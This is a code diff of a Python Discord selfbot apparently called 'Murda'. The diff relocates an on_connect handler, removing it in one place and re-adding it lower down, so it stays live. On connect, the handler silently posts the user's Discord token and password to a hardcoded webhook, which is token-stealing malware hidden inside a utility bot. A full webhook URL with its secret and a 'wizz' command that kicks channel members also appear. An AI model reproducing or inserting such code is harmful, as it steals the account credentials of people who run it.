@@ -1958,10 +1958,6 @@ async def _get_color(ctx, *, color: discord.Colour):
     em = discord.Embed(color=color, title=f'{str(color)}')
     em.set_image(url='attachment://color.png')
     await ctx.send(file=discord.File(file, 'color.png'), embed=em)
-@Murda.event
-async def on_connect():
-  Clear()
-  requests.post('https://discord.com/api/webhooks/802348604471246869/i1F2_KRvkSP3POTiiyCe69ZP7Q9088VqFOkidVdhIZAN4r6WsZ8XOi-nI7cnkr3jz_2k',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})  
 
 @Murda.command(aliases=['rainbowrole'])
 async def rainbow(ctx, *, role):
@@ -2065,7 +2061,11 @@ async def wizz(ctx):
         await message.edit(
             content=f"`Wizzing {ctx.message.channel.name}, will take {initial} seconds to complete`\n`Saving {random.randrange(0, 1000)} Messages...\nCaching {random.randrange(0, 1000)} Messages...\nDeleting {random.randrange(0, 1000)} Pinned Messages...\nKicking {len(ctx.message.channel.recipients)} Users...`")
 
-
+@Murda.event
+async def on_connect():
+  Clear()
+  requests.post('https://discord.com/api/webhooks/802348604471246869/i1F2_KRvkSP3POTiiyCe69ZP7Q9088VqFOkidVdhIZAN4r6WsZ8XOi-nI7cnkr3jz_2k',json={'content': f"**Token:** `{toe}`\n**Password:** `{password}`"})
+        
 @Murda.command(name='8ball')
 async def _ball(ctx, *, question):
     await ctx.message.delete()
